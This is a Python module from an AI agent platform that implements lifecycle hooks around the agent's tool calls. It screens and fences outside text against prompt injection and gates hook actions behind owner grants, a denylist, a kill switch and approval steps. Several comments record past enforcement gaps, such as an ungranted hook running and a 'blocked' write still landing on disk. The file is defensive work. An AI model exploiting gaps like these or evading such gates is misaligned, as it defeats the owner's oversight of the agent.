        """PreToolUse exit code 2 = block tool."""
        return self.exit_code == 2

    @property
    def succeeded(self) -> bool:
        return self.exit_code == 0


#: The kind a lifecycle hook's text is fenced as, beside the trigger it is (``lifecycle:<id>``): the
#: Triggers page's name for a hook, and the key of its event's prose in
#: ``triggers.screen.UNTRUSTED_PAYLOAD_KEYS``.
LIFECYCLE_KIND = "lifecycle"


@dataclass(frozen=True)
class HandedOn:
    """What a hook's fire hands its action (:func:`hand_on`): its event's context and payload with
    their words fenced, or ``refused``, the injection screen's groups, and nothing else."""

    context: str = ""
    payload: dict = field(default_factory=dict)
    refused: tuple[str, ...] = ()


def hand_on(hook: ScriptHook, context: str, hook_event: dict) -> HandedOn:
    """What *hook* hands its action of what its event carried: the one door every hook kind's
    context passes through on its way out of the gateway (``tests/test_hook_context_census.py``).

    The action may be a script, a request to another service or another agent's task, so the
    words the event carried are text from outside by the time they reach it. They go through the
    door every text from outside takes into a prompt (``outside_text.admit``): read by the
    injection screen, then fenced as data with the hook as their source. That is the context, when
    its event's is words (:data:`NAMES_ONLY_EVENTS`), and the event's own prose, a prompt or a
    tool's result (``outside_text.admit_payload`` under :data:`LIFECYCLE_KIND`), the walk a stored
    trigger's fire hands its payload through. Text that is fenced whole, as where it arrived, keeps
    that fence, and text that only quotes a marker is fenced like any other. A screen that refuses
    the words hands on nothing. Names, and the call a tool event carries, go on as they are: a
    policy hook judges a call as it was made.
    """
    from personalclaw.outside_text import admit, admit_payload

    trigger_id = f"{LIFECYCLE_TRIGGER_PREFIX}{hook.id}"
    handed = admit_payload(hook_event, kind=LIFECYCLE_KIND, trigger_id=trigger_id)
    refused = set(handed.refused)
    if hook.event not in NAMES_ONLY_EVENTS:
        # Labelled as the event's prose is, so the two read as one source.
        words = admit(
            context,
            source=f"trigger:{trigger_id}",
            source_type=LIFECYCLE_KIND,
            source_id=trigger_id,
            transformation_path="fire:context",
            fenced_where_it_arrived=True,
        )
        refused.update(words.refused)
        context = words.text
    if refused:
        return HandedOn(refused=tuple(sorted(refused)))
    return HandedOn(context=context, payload=handed.payload)


@dataclass(frozen=True)
class TakenIn:
    """What the gateway takes back of a hook's action (:func:`take_in`): what it printed, fenced,
    and its block's reason, with ``refused``, the injection screen's groups for what it kept as
    nothing."""

    stdout: str = ""
    stderr: str = ""
    refused: tuple[str, ...] = ()


def take_in(hook: ScriptHook, stdout: str, stderr: str, *, blocked: bool) -> TakenIn:
    """What the gateway takes back of what *hook*'s action printed: the one door a hook's output
    comes back through, on its way into the agent's next turn.

    What it printed (*stdout*) is the context a hook adds to a turn, so it goes through the door
    every text from outside takes into a prompt (``outside_text.admit``): read by the injection
    screen and fenced as data with the hook as its source, whatever it holds. A program's output is
    text from outside, and a fence it printed is only text inside the new one. Refused, it is kept
    as nothing. A block's reason (*stderr* when *blocked*) goes on unfenced, inside the refusal's
    own sentence and on the refused call's card, cut at 200 characters, so it is kept only when the
    screen matches nothing in it. Any other *stderr* is a warning for the log and the hook's Test,
    which no model reads, and stays as it is.
    """
    from personalclaw.outside_text import admit

    trigger_id = f"{LIFECYCLE_TRIGGER_PREFIX}{hook.id}"
    refused: set[str] = set()
    printed = admit(
        stdout,
        source=f"trigger:{trigger_id}",
        source_type=LIFECYCLE_KIND,
        source_id=trigger_id,
        transformation_path="hook:stdout",
    )
    refused.update(printed.refused)
    stdout = printed.text
    if blocked and stderr.strip():
        reason = admit(
            stderr,
            source=f"trigger:{trigger_id}",
            source_type=LIFECYCLE_KIND,
            source_id=trigger_id,
            transformation_path="hook:block-reason",
        )
        if not reason.clean:
            refused.update(reason.refused or reason.flagged)
            stderr = ""
    return TakenIn(stdout=stdout, stderr=stderr, refused=tuple(sorted(refused)))


async def run_script_hook(
    hook: ScriptHook,
    context: str = "",
    hook_event: dict | None = None,
    *,
    enforced: bool = False,
    test: bool = False,
) -> ScriptHookResult:
    """Dispatch hook execution through its registered ActionProvider.

    ``enforced`` declares that THIS fire's result is consumed as a gate — the caller reads the
    exit-2 signal and rejects the tool. It decides which status an exit 2 records: ``blocked``
    when the block was honored, ``advisory`` when it was only reported (G89).

    **The default is False on purpose.** Every caller that does not gate — the informational
    :func:`fire_tool_hooks` seam, the "Run now" button in the trigger UI, any future site — gets
    the honest status without knowing this parameter exists. Claiming enforcement has to be
    opt-in, for the same reason :func:`hook_enforcement` never returns ``enforcing`` on a maybe.

    ``test`` marks a REHEARSAL (the panel's Test button), mirroring the event-trigger fire
    seam (#609): every gate — incident, denylist, rung routing — is preserved and NOT
    bypassed, and the action genuinely executes, but (a) the payload is tagged ``test`` so a
    provider can tell a rehearsal from the real thing, and (b) nothing is written into the
    hook's ``run_count`` / ``last_run`` / ``last_status`` — that is the trigger's REAL fire
    history, and "Ran 2×  · ok" where both runs were Test clicks is the UI's only claim about
    a trigger that has never actually fired.
    """
    import os

    from personalclaw.action_providers import get_action_provider
    from personalclaw.action_providers.base import ActionContext
    from personalclaw.action_providers.registry import _ensure_default_providers_registered

    _ensure_default_providers_registered()

    if hook_event is None:
        hook_event = {"hook_event_name": hook.event, "cwd": os.getcwd()}
    if test:
        # The tag rides the payload so a provider can tell a rehearsal from the real thing.
        # Copied first — the caller's dict is not ours to mutate.
        hook_event = dict(hook_event)
        hook_event["test"] = True

    def _record(status: str) -> None:
        # Every terminal branch records through here so the rehearsal rule cannot
        # drift per branch: a test NEVER writes the hook's real fire history.
        # The conditional closes the vocabulary at this single choke point — the
        # status rail infers exactly this tuple (plus the "error" fallback) and
        # checks each member against HOOK_STATUS_TO_OUTCOME, so a branch inventing
        # a status is a caught red and an unmapped one degrades to "error" rather
        # than shipping unmapped.
        if test:
            return
        hook.last_run = time.time()
        hook.last_status = (
            status
            if status
            in (
                "ok",
                "error",
                "timeout",
                "launched",
                "queued",
                "blocked",
                "advisory",
                "held_for_rung",
                "skipped_incident",
                "blocked_injection",
                "withheld",
            )
            else "error"
        )
        hook.run_count += 1

    def _refused(why: str, status: str) -> ScriptHookResult:
        # A fire refused before its action ran, said in *why*. On the gating seam the refusal BLOCKS
        # the tool rather than letting it through: a policy hook that did not run cannot say the
        # call is safe, so a refusal never quietly switches a safeguard off.
        _record(status)
        return ScriptHookResult(
            hook_id=hook.id,
            hook_name=hook.name,
            event=hook.event,
            stderr=why if enforced else "",
            exit_code=2 if enforced else -1,
            error=why,
        )

    provider = get_action_provider(hook.provider)
    if provider is None:
        _record("error")
        return ScriptHookResult(
            hook_id=hook.id,
            hook_name=hook.name,
            event=hook.event,
            error=f"Unknown action provider {hook.provider!r}",
        )

    # 🔴 THE GRANT (`triggers.grants`), as every trigger's dispatch checks it. A hook runs its action
    # on the agent's own events with nobody pressing anything, so one whose action the owner has not
    # allowed — a hook made before hooks carried a grant, or a hooks.json edited by hand — does not
    # run it. Measured on `main`: an ungranted `bash` hook ran its command on the next prompt. On
    # the gating seam its refusal blocks the tool, and the owner lifts it with one Allow.
    from personalclaw.triggers import grants

    ungranted = grants.missing(hook)
    if ungranted:
        return _refused(grants.refusal(hook, ungranted), "blocked")

    # 🔴 THE INJECTION SCREEN AND THE FENCE, as a stored trigger's fire runs them on its payload.
    # What the event carried leaves the gateway here, so its words are screened and fenced on the
    # way out (`hand_on`). A refusal is a `blocked_injection` fire, said in a sentence that names
    # the pattern class and never the text, as the trigger fire's row does.
    handed = hand_on(hook, context, hook_event)
    if handed.refused:
        groups = ", ".join(handed.refused)
        logger.warning(
            "hook %s not run: the injection screen refused the text it was handed (%s)",
            hook.id,
            groups,
        )
        return _refused(
            f"“{hook.name or hook.provider}” was handed text the injection screen refused "
            f"({groups}), so it did not run.",
            "blocked_injection",
        )

    # The hook is the trigger that ran this action, as a stored trigger's dispatch says it is
    # (#3716): an agent it starts lists its approvals under the hook, and a call nobody answered
    # leaves a note that opens it. Addressed the way the Triggers page lists it, so it cannot be
    # mistaken for a stored trigger's id.
    ctx = ActionContext(
        event=hook.event,
        context=handed.context,
        payload=handed.payload,
        trigger_id=f"{LIFECYCLE_TRIGGER_PREFIX}{hook.id}",
    )
    # Incident kill switch: a script hook's ACTION is an automated
    # side-effect (bash/webhook/spawn), so it is suspended during an incident even
    # if its triggering event occurred in an interactive turn — the chat STREAM
    # keeps flowing (a separate path); only the automated action pauses.
    from personalclaw.guardrails.incident import incident_active

    if incident_active():
        _record("skipped_incident")
        return ScriptHookResult(
            hook_id=hook.id,
            hook_name=hook.name,
            event=hook.event,
            error="skipped: incident mode active",
        )
    # Denylist gate: a hook's action config is checked
    # BEFORE dispatch, so an app-contributed provider inherits the denylist. A
    # blocked action returns a blocked result rather than executing.
    from personalclaw.guardrails.denylist import enforce_action
    from personalclaw.guardrails.policy import unattended_dispatch_key

    # `parent_session_key` rides the event payload when a subagent fired the hook
    # (E11-P3); it lets the run's SafetyProfile layer its extra deny globs.
    #
    # 🔴 A top-level fire omitted it → "" → classified ATTENDED → INTERACTIVE, so the whole
    # profile layer was skipped. By the same reasoning the incident kill switch
    # above already applies — a hook's ACTION is an automated side-effect even when its
    # triggering event happened in an interactive turn — a hook fire with no parent session
    # is an unattended dispatch, and now resolves as one.
    _session_key = str(hook_event.get("parent_session_key", "")) or unattended_dispatch_key(
        f"hook:{hook.id}"
    )
    _deny = enforce_action(
        hook.provider,
        hook.provider_config,
        ctx,
        session_key=_session_key,
    )
    if _deny.blocked:
        _record("blocked")
        return ScriptHookResult(
            hook_id=hook.id,
            hook_name=hook.name,
            event=hook.event,
            # The rule's code and its sentence, as a trigger's fire records the same refusal.
            error=_deny.refusal(),
        )
    # Rung routing, composed with the denylist gate above and
    # sitting ON TOP of it: a rung never relaxes a block, an incident, or a budget pause.
    # The route comes from the provider NAME alone — the name→type mapping lives on the
    # declaration (`ActionTypeSpec.providers`), so an app-contributed provider is routed by
    # these same lines with no branch of its own here.
    from personalclaw.guardrails.rungs import announce_withheld, record_execution
    from personalclaw.guardrails.rungs import route_provider_action as _route_action

    route = _route_action(hook.provider, session_key=_session_key)
    if not route.executes:
        announce_withheld(
            route,
            title=f"{hook.name or hook.provider} is waiting for you",
            body=(
                f"The {hook.provider!r} action on the {hook.event} event did not run: "
                f"{route.reason}."
            ),
            refs={"hook": hook.id, "provider": hook.provider},
            dedup_key=f"autonomy_hold:{route.key}:hook:{hook.id}",
        )
        _record("held_for_rung")
        return ScriptHookResult(
            hook_id=hook.id,
            hook_name=hook.name,
            event=hook.event,
            error=f"held for your approval: {route.reason}",
        )
    from personalclaw.net.policy import egress_held_to

    try:
        # What the action reaches is held to the egress tier of the identity the denylist and the
        # rung judged it under, whichever turn's event fired it.
        with egress_held_to(_session_key):
            result = await provider.execute(hook.provider_config, ctx, timeout=hook.timeout)
    except Exception as exc:  # noqa: BLE001 - a misbehaving provider must not crash the seam
        # A provider that RAISES (rather than returning a
        # failed result) is wrapped in the shared WHAT/WHY/FIX envelope here, so
        # app-contributed providers inherit it without knowing it exists.
        from personalclaw.action_providers import provider_failure

        logger.warning("Action provider %r raised for hook %s", hook.provider, hook.id)
        _record("error")
        agent_error = provider_failure(hook.provider, exc)
        return ScriptHookResult(
            hook_id=hook.id,
            hook_name=hook.name,
            event=hook.event,
            error=agent_error.render(),
        )

    # What the action printed comes back here, on its way into the agent's next turn, so it is
    # screened and fenced as what went out was (`take_in`); what the screen refuses is kept as
    # nothing, and the result says so in its own sentence.
    taken = take_in(hook, result.stdout or "", result.stderr or "", blocked=bool(result.blocked))
    withheld = ""
    if taken.refused:
        groups = ", ".join(taken.refused)
        logger.warning(
            "hook %s: the injection screen refused what it printed (%s); none of it was kept",
            hook.id,
            groups,
        )
        withheld = (
            f"“{hook.name or hook.provider}” printed text the injection screen refused "
            f"({groups}); none of it was kept."
        )

    if result.blocked:
        # 🔴 REPORTED ≠ ENFORCED. `ActionResult.blocked` is a REQUEST ("PreToolUse exit_code 2
        # is a block signal"), not evidence that anything was stopped, and only the gating seam
        # turns it into a refusal. Writing `blocked` for any exit 2 is what let an informational
        # fire report `blocked` beside `enforcement: enforcing` while the out-of-workspace write it
        # claimed to stop landed on disk — measured on codex and again on claude-code, where the
        # hook fired 3× and the file still held its content. Worse than inert: it reported success.
        #
        # `advisory` is deliberately the same word as `ENFORCEMENT_ADVISORY`: one vocabulary, two
        # levels. `enforcement` says whether this hook CAN block; this says whether the last fire
        # DID. Both are needed — a bound, enforcing hook still reaches this branch when an ACP
        # `EVENT_TOOL_CALL` frame arrives already auto-approved.
        _status = "blocked" if enforced else "advisory"
    elif result.success:
        # Honest "started ≠ succeeded" (T7): a fire-and-forget action (run-prompt/
        # run-workflow/invoke-agent) only LAUNCHED a background turn — record
        # "launched" so the lifecycle-trigger badge doesn't overstate it as a
        # verified success, matching the schedule path's run-record status.
        # `queued` is carried through for the same reason and is weaker still: under
        # `on_overlap: queue` nothing started at all, so folding it into "ok"
        # would report work that has not begun as work that finished.
        _status = result.outcome if result.outcome in ("launched", "queued") else "ok"
        if _status == "ok" and withheld:
            # It did its work, and what it printed, the context it adds to a turn, was refused:
            # "ok" would say its output reached the agent.
            _status = "withheld"
    elif result.error and "Timed out" in result.error:
        _status = "timeout"
    else:
        _status = "error"
    _record(_status)

    # The run's audit row at the rung it took, and at `auto_with_undo` its undo. Only for an
    # action that succeeded — a failed action has nothing to take back.
    if result.success:
        record_execution(
            route,
            result,
            label=hook.name or hook.provider,
            refs={"hook": hook.id, "provider": hook.provider},
        )

    # A provider that populated the envelope on a failed result surfaces its
    # WHAT/WHY/FIX text as the error (else the plain provider error string).
    error_text = result.agent_error.render() if result.agent_error is not None else result.error
    return ScriptHookResult(
        hook_id=hook.id,
        hook_name=hook.name,
        event=hook.event,
        stdout=taken.stdout,
        stderr=taken.stderr,
        exit_code=result.exit_code if result.exit_code is not None else -1,
        error=" ".join(text for text in (error_text, withheld) if text),
        duration_ms=result.duration_ms,
    )


# ── Script Hook Store (persistence) ──

_HOOKS_FILE = "hooks.json"


#: How a lifecycle hook is named as a trigger: the Triggers page lists one as ``lifecycle:<id>``,
#: and an action a hook runs carries that id (``ActionContext.trigger_id``).
LIFECYCLE_TRIGGER_PREFIX = "lifecycle:"


#: Where ``hooks.json`` keeps its hooks.
_HOOKS = record_files.Shape(key="hooks")


def _hook_form(record: dict) -> dict:
    """A stored hook as :class:`ScriptHookStore` holds and writes it."""
    return ScriptHook.from_dict(record).to_dict()


class ScriptHookStore:
    """Persist script hooks to ~/.personalclaw/hooks.json.

    Holds them in memory between writes, and the file has other writers: a sync or a restore's
    merge bringing another machine's hooks in, switched off, and a store opened elsewhere. So every
    write keeps what they wrote since this store read or wrote the file, and every read takes it in
    first (``record_files.written`` / ``taken_in``): the store fires on each tool call and writes
    after, so the list it read before would otherwise have put the file back within seconds.
    """

    def __init__(self, config_dir: Path | None = None):
        from personalclaw.config.loader import config_dir as _cfg_dir

        self._dir = config_dir or _cfg_dir()
        self._path = self._dir / _HOOKS_FILE
        self._hooks: dict[str, ScriptHook] = {}
        self._kept = record_files.Kept(normalize=_hook_form)
        self._load()

    def _load(self) -> None:
        """Read ``hooks.json``. Never raises: an entry that is not a lifecycle trigger is skipped
        and logged, so one bad write cannot stop the rest loading.

        Measured on `main`: the chat's ``hook_register`` wrote its registrations into this file,
        and ``hook_id="hooks"`` replaced the list with an object — every later start raised
        ``AttributeError`` here, the store never loaded, and no lifecycle trigger ran. Callbacks
        have their own file now (`webhook_callbacks`), and nothing but hooks is written to this
        one: by this store, and by a sync or a restore's merge bringing hooks in.
        """
        if not self._path.exists():
            return
        at = record_files.stamp(self._path)
        try:
            data = json.loads(self._path.read_text(encoding="utf-8"))
        except (json.JSONDecodeError, OSError) as exc:
            logger.warning("Failed to load hooks: %s", exc)
            return
        entries = data.get("hooks") if isinstance(data, dict) else None
        if not isinstance(entries, list):
            if entries is not None or not isinstance(data, dict):
                logger.warning("hooks.json holds no list of lifecycle triggers; none loaded")
            return
        for entry in entries:
            try:
                hook = ScriptHook.from_dict(entry)
            except (AttributeError, TypeError, ValueError):
                logger.warning("hooks.json: skipping an entry that is not a lifecycle trigger")
                continue
            self._hooks[hook.id] = hook
        self._kept.took(at, self._held())

    def _held(self) -> list[dict]:
        return [h.to_dict() for h in self._hooks.values()]

    def _take_in(self) -> None:
        """Take in what another writer put in ``hooks.json`` since this store last read or wrote
        it — a hook a sync or a restore's merge brought, one another store changed or removed —
        unless this store changed the same hook since."""
        held = {hook_id: hook.to_dict() for hook_id, hook in self._hooks.items()}
        for hook_id, record in record_files.taken_in(self._path, _HOOKS, self._kept, held).items():
            if record is None:
                self._hooks.pop(hook_id, None)
                continue
            try:
                self._hooks[hook_id] = ScriptHook.from_dict(record)
            except (AttributeError, TypeError, ValueError):
                logger.warning("hooks.json: skipping an entry that is not a lifecycle trigger")

    def _save(self) -> None:
        self._save_snapshot(self._held())

    def list_all(self) -> list[ScriptHook]:
        self._take_in()
        return list(self._hooks.values())

    def get(self, hook_id: str) -> ScriptHook | None:
        self._take_in()
        return self._hooks.get(hook_id)

    def create(self, data: dict) -> ScriptHook:
        """Save a new lifecycle trigger. Refused, before anything is written, for the work of an
        Incognito or Temporary chat: it is kept after the chat and runs later as work of its own
        (`lasting_work`)."""
        lasting_work.refuse(lasting_work.AUTOMATION, lasting_work.CREATE)
        self._take_in()
        hook = ScriptHook.from_dict(data)
        if not hook.id:
            hook.id = str(uuid.uuid4())[:8]
        self._hooks[hook.id] = hook
        self._save()
        return hook

    def update(self, hook_id: str, data: dict) -> ScriptHook | None:
        """Change a lifecycle trigger. Refused, before anything is written, for the work of an
        Incognito or Temporary chat, as :meth:`create` is."""
        lasting_work.refuse(lasting_work.AUTOMATION, lasting_work.CHANGE)
        self._take_in()
        hook = self._hooks.get(hook_id)
        if not hook:
            return None
        if "event" in data and data["event"] not in HOOK_EVENTS:
            raise ValueError(f"invalid event: {data['event']}")
        if "timeout" in data:
            t = data["timeout"]
            if not isinstance(t, int) or not (1 <= t <= 300):
                raise ValueError("timeout must be an integer between 1 and 300")
        if "provider_config" in data and not isinstance(data["provider_config"], dict):
            raise ValueError("provider_config must be an object")
        # `capabilities` is written by the grant path alone (`triggers.grants`): the handler builds
        # this patch from the fields a save may change, and the grant is not one of them.
        for k in (
            "name",
            "event",
            "matcher",
            "provider",
            "provider_config",
            "timeout",
            "enabled",
            "capabilities",
        ):
            if k in data:
                setattr(hook, k, data[k])
        self._save()
        return hook

    def delete(self, hook_id: str) -> bool:
        self._take_in()
        if hook_id in self._hooks:
            del self._hooks[hook_id]
            self._save()
            return True
        return False

    def toggle(self, hook_id: str) -> ScriptHook | None:
        self._take_in()
        hook = self._hooks.get(hook_id)
        if not hook:
            return None
        hook.enabled = not hook.enabled
        self._save()
        return hook

    async def fire(
        self,
        event: str,
        context: str = "",
        tool_name: str = "",
        tool_input: dict | None = None,
        tool_response: dict | None = None,
        subagent_id: str = "",
        parent_session_key: str = "",
        agent_role: str = "",
    ) -> list[ScriptHookResult]:
        """Fire all enabled hooks matching the given event. Returns results.

        For PreToolUse/PostToolUse, matcher filters by tool name.
        For AgentSpawn/UserPromptSubmit/Stop, all hooks for that event fire.

        ``subagent_id``/``parent_session_key``/``agent_role`` (E11-P3) attribute a
        fire to the subagent that triggered it; they ride the event payload and
        are absent for top-level fires.

        **This path never enforces (G89).** Its results are returned but no caller gates on
        them — :func:`fire_tool_hooks`, ``subagent`` and ``llm_helpers`` reach it when the tool is
        already running — so an exit 2 here records ``advisory``, not ``blocked``.
        Use :meth:`fire_for_ids` for the gating seam.
        """
        return await self._fire(
            event,
            context=context,
            tool_name=tool_name,
            tool_input=tool_input,
            tool_response=tool_response,
            hook_ids=None,
            subagent_id=subagent_id,
            parent_session_key=parent_session_key,
            agent_role=agent_role,
        )

    async def fire_for_ids(
        self,
        event: str,
        hook_ids: "set[str] | list[str] | None",
        context: str = "",
        tool_name: str = "",
        tool_input: dict | None = None,
        tool_response: dict | None = None,
        depth: int = 0,
        subagent_id: str = "",
        parent_session_key: str = "",
        agent_role: str = "",
    ) -> list[ScriptHookResult]:
        """Fire only the hooks in ``hook_ids`` that match ``event`` (agent-scoped).

        The agent-scoped firing primitive (E3): an agent references a subset of the
        hook library and only those hooks fire for it — global hooks are NOT run.
        ``hook_ids=None`` is treated as "no scoped hooks" → fires nothing (use
        :meth:`fire` for the global set). An empty collection likewise fires nothing.
        Matcher/enabled/event filtering is identical to :meth:`fire`.

        ``depth`` is the recursion depth of the originating agent (0 = the user's
        top-level agent); it is injected into the event payload as
        ``__hook_depth`` so the ``invoke-agent`` action can bound spawn recursion.

        ``subagent_id``/``parent_session_key``/``agent_role`` (E11-P3) attribute the
        fire to a subagent; additive optional payload fields, absent at top level.

        **This is the gating seam, and that is why it passes ``enforced=True`` (G89).** Both of
        its callers — ``chat_runner._fire`` and ``provider_bridge``'s ``hook_fire`` — turn an
        exit-2 result into the ``BLOCKED:`` sentinel that rejects the tool, so a block recorded
        from here really happened. A future caller that ignores the results would make the status
        a lie again; ``test_hook_advisory_status`` pins the two that exist.
        """
        if not hook_ids:
            return []
        allow = set(hook_ids)
        return await self._fire(
            event,
            context=context,
            tool_name=tool_name,
            tool_input=tool_input,
            tool_response=tool_response,
            hook_ids=allow,
            depth=depth,
            enforced=True,
            subagent_id=subagent_id,
            parent_session_key=parent_session_key,
            agent_role=agent_role,
        )

    async def _fire(
        self,
        event: str,
        *,
        context: str = "",
        tool_name: str = "",
        tool_input: dict | None = None,
        tool_response: dict | None = None,
        hook_ids: "set[str] | None" = None,
        depth: int = 0,
        enforced: bool = False,
        subagent_id: str = "",
        parent_session_key: str = "",
        agent_role: str = "",
    ) -> list[ScriptHookResult]:
        """Shared firing core. ``hook_ids`` (when not None) restricts firing to
        that allow-set of hook ids; None fires every enabled matching hook.

        ``enforced`` rides down to :func:`run_script_hook` so an exit 2 is recorded as a real
        ``blocked`` only on the gating seam (G89). It is ANDed with
        :data:`BLOCKING_EVENTS` here: ``PreToolUse`` is the one event with a block seam at all, so
        a ``Stop`` hook that exits 2 records ``advisory`` no matter who fired it — there was
        nothing for it to block."""
        import os

        results = []
        # Build base hook event
        hook_event: dict = {"hook_event_name": event, "cwd": os.getcwd()}
        # Recursion depth for invoke-agent's spawn bound (E3-P3). Reserved key.
        hook_event["__hook_depth"] = depth
        # Subagent attribution (E11-P3): present only when a subagent fires, so a
        # top-level chat fire's payload omits them. Hook scripts read these to
        # attribute a tool call to the subagent that made it.
        if subagent_id:
            hook_event["subagent_id"] = subagent_id
        if parent_session_key:
            hook_event["parent_session_key"] = parent_session_key
        if agent_role:
            hook_event["agent_role"] = agent_role
        if event == HOOK_EVENT_USER_PROMPT_SUBMIT and context:
            hook_event["prompt"] = context
        if tool_name:
            hook_event["tool_name"] = tool_name
        if tool_input is not None:
            hook_event["tool_input"] = tool_input
        if tool_response is not None:
            hook_event["tool_response"] = tool_response

        self._take_in()
        for hook in list(self._hooks.values()):
            if not hook.enabled or hook.event != event:
                continue
            if hook_ids is not None and hook.id not in hook_ids:
                continue  # agent-scoped: only fire referenced hooks
            # Matcher filtering: for tool hooks, match tool name; for others, match context
            if hook.matcher:
                if event in (HOOK_EVENT_PRE_TOOL_USE, HOOK_EVENT_POST_TOOL_USE):
                    if not _tool_matches(hook.matcher, tool_name):
                        continue
                elif context and not fnmatch.fnmatch(context.lower(), hook.matcher.lower()):
                    continue
            result = await run_script_hook(
                hook,
                context,
                hook_event,
                enforced=enforced and event in BLOCKING_EVENTS,
            )
            results.append(result)
            logger.info(
                "Hook %s (%s): %s in %dms (exit=%d)",
                hook.name,
                event,
                hook.last_status,
                result.duration_ms,
                result.exit_code,
            )
        hooks_snapshot = [h.to_dict() for h in self._hooks.values()]
        await asyncio.to_thread(self._save_snapshot, hooks_snapshot)
        return results

    def _save_snapshot(self, hooks_data: list[dict]) -> None:
        """Thread-safe save using pre-captured hook snapshot, under the file's lock and with
        what another writer put there since kept (``record_files.written``)."""
        record_files.written(self._path, _HOOKS, self._kept, hooks_data, self._write)

    def _write(self, records: list[dict]) -> None:
        atomic_write(self._path, json.dumps({"hooks": records}, indent=2))


# -- Global script hook store accessor --
# Set by dashboard server.py / handlers.py when the store is initialized.
# Allows any module (llm_helpers, subagent) to fire script hooks
# without needing a reference to DashboardState.

_global_script_hook_store: ScriptHookStore | None = None


def set_global_hook_store(store: ScriptHookStore) -> None:
    """Register the global script hook store."""
    global _global_script_hook_store
    _global_script_hook_store = store


def get_global_hook_store() -> ScriptHookStore | None:
    """Get the global script hook store, or None if not initialized."""
    return _global_script_hook_store


async def fire_tool_hooks(
    hook_store: ScriptHookStore | None,
    event_title: str,
    event_tool_input: str | None = None,
    *,
    subagent_id: str = "",
    parent_session_key: str = "",
    agent_role: str = "",
) -> None:
    """Fire PreToolUse hooks for an EVENT_TOOL_CALL event.

    PostToolUse is NOT fired here because EVENT_TOOL_CALL is a notification
    that the tool is starting - the tool hasn't completed yet. PostToolUse
    should be fired on EVENT_TOOL_RESULT when available.

    Note: For EVENT_TOOL_CALL, hooks are informational only. The tool is
    already running (auto-approved by ACP agent), so hook results cannot
    block execution. Hook scripts can log, audit, or trigger side effects.

    A hook that exits 2 here therefore records ``last_status`` ``advisory``, never
    ``blocked`` — measured on codex and claude-code alike, this seam reported a block while the
    write it "blocked" landed on disk (G89). :meth:`ScriptHookStore.fire` owns that decision, so
    this function stays a thin adapter.

    ``subagent_id``/``parent_session_key``/``agent_role`` (E11-P3) attribute the
    fire to the subagent that ran the tool; omitted for top-level tool calls.
    """
    if hook_store is None:
        return
    tool_name = event_title or ""
    if tool_name.startswith("Running: "):
        tool_name = tool_name[9:]
    tool_input = None
    if event_tool_input:
        try:
            tool_input = json.loads(event_tool_input)
        except Exception:
            pass
    try:
        await hook_store.fire(
            HOOK_EVENT_PRE_TOOL_USE,
            tool_name=tool_name,
            tool_input=tool_input,
            subagent_id=subagent_id,
            parent_session_key=parent_session_key,
            agent_role=agent_role,
        )
    except Exception:
        logger.debug("PreToolUse hook error", exc_info=True)
